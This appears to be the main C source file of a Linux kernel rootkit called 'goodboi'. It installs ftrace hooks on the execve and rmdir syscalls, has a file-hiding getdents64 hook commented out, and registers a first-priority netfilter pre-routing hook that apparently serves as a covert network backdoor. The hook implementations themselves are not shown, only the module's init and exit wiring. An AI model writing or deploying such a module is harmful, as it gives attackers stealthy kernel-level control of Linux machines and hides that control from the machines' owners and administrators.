#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "inc/ftrace/ftrace_helper.h"
#include "inc/logger/logger.h"

// ////////////////////////////////////////////////////////////////////

#include "inc/hooks/syscall/execve/execve.h"
// #include "inc/hooks/syscall/getdents64/getdents64.h"
#include "inc/hooks/syscall/rmdir/rmdir.h"

// ////////////////////////////////////////////////////////////////////

#include "inc/hooks/netfilter/server/server.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aspheric_");
MODULE_DESCRIPTION("What a goodboi");

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

int err;

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

struct ftrace_hook dir_hooks[] = {
    HOOK("sys_execve", hook_execve, &real_execve),
    // HOOK("sys_getdents64", hook_getdents64, &real_getdents64),
    HOOK("sys_rmdir", hook_rmdir, &real_rmdir),
};

// ////////////////////////////////////////////////////////////////////

static struct nf_hook_ops nfho = {
    .hook = hook_nf_server,
    .hooknum = NF_INET_PRE_ROUTING,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST,
};

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

static int __init goodboi_init(void) {
    rk_info("[goodboi_init] loading goodboi module...\n");

    if ((err = fh_install_hooks(dir_hooks, ARRAY_SIZE(dir_hooks))))
        rk_info("[goodboi_init] failed to install hooks\n");

    if ((err = nf_register_net_hook(&init_net, &nfho)) < 0) {
        rk_info("[goodboi_init] failed to install netfilter hook\n");
    }

    rk_info("[goodboi_init] goodboi loaded!\n");

    return 0;
}

static void __exit goodboi_exit(void) {
    rk_info("[goodboi_exit] unloading goodboi module...\n");

    fh_remove_hooks(dir_hooks, ARRAY_SIZE(dir_hooks));
    nf_unregister_net_hook(&init_net, &nfho);

    rk_info("[goodboi_exit] goodboi unloaded!\n");
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

module_init(goodboi_init);
module_exit(goodboi_exit);
